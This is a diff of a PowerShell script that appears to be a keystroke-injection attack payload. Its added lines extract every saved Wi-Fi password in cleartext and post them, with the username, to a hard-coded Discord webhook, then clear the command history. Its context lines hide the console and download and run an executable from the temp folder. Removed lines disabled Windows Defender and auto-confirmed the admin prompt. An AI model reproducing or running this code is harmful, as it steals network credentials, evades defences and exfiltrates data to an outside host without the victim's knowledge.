@@ -1,15 +1,5 @@
 # # FIRST THINGS FIRST
 
-# # Disable Windows Defender Real-time Protection
-# Set-MpPreference -DisableRealtimeMonitoring $true
-
-# If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
-#   Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
-#   Exit	
-# }
-
-
-
 # # Check if running with Administrator privileges
 # If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
 #     # Relaunch PowerShell as administrator
@@ -18,16 +8,7 @@
 #     Exit
 # }
 
-# # Load Windows Forms assembly
-# Add-Type -AssemblyName 'System.Windows.Forms'
-
-# # Give some time for the window to be in focus (if necessary)
-# Start-Sleep -Seconds 6
-
-# # Send Alt+Y
-# [System.Windows.Forms.SendKeys]::SendWait('%y')
-
-
+## Send ALT+y in duck script
 
 # # If script reaches here, it is running with Administrator privileges
 # Write-Host "This script is running with Administrator privileges."
@@ -36,6 +17,24 @@
 
 # Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
 # ##############################################################################
+
+# ENG
+netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
+    $wlan  = $_.Matches.Value
+    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
+	$discord='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
+
+	$Body = @{
+		'username' = $env:username + " | " + [string]$wlan
+		'content' = [string]$passw
+	}
+	
+	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
+	
+}
+
+# Clear the PowerShell command history
+Clear-History
 
 ##############################################
 
@@ -63,7 +62,7 @@ Add-Type @"
 # Hide the console window
 [ConsoleWindow]::Hide()
 
-######################################################################################
+###############################################################################
 
 
 # Define the URL of the file to be downloaded
@@ -79,6 +78,7 @@ Invoke-WebRequest -Uri $url -OutFile $tempPath
 #Write-Host "File downloaded to: $tempPath"
 
 ###############################################################################
+
 
 #i open the app byconverting the hex to ek and run in the memory
 
@@ -99,7 +99,7 @@ $tempExePath = Join-Path $env:TEMP "example.exe"
 [System.IO.File]::WriteAllBytes($tempExePath, $bytes)
 
 
-##########################################################################
+###############################################################################
 
 # Start the executable
 $process = Start-Process $tempExePath
@@ -136,6 +136,7 @@ Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Proc
 #Write-Host "Process completed and all instances closed."
 
 
+###########################################################################
 
 # Define the webhook URL
 $webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'
